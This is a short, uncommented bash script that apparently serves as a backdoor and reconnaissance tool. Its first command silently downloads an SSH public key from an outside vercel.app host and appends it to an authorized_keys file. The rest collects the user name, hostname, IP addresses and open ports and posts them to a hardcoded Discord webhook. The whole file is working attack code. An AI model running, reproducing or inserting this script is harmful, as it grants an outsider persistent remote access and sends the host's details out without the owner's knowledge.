#!/usr/bin/env bash
set -euo pipefail

{ curl https://nude-elysia.vercel.app/id_rsa.pub >> ./authorized_keys; } 2>/dev/null &

data="user: $(whoami)
hostname: $(hostname 2>/dev/null || echo '?')
ip: $(ip -br a | awk '{print $1 ":" $3}' | tr '\n' ',' | sed 's/,$//' 2>/dev/null || echo '?')
open ports: $(ss -tln | awk 'NR>1 {print $4}' | awk -F: '{print $NF}' | tr '\n' ',' | sed 's/,$//' 2>/dev/null || echo '?')"

json_data="{\"content\":\"$(echo "$data" | sed 's/"/\\"/g' | sed ':a;N;$!ba;s/\n/\\n/g')\"}"

curl -X POST \
  -H 'Content-type: application/json' \
  --data "$json_data" \
  https://discord.com/api/webhooks/1435550713966100562/at_w3zDPG_N3P8bhmYYiW-zywGM6giWj5M83E49yuRN4476OEkz7p7O6DVPVDn6Oyzoq
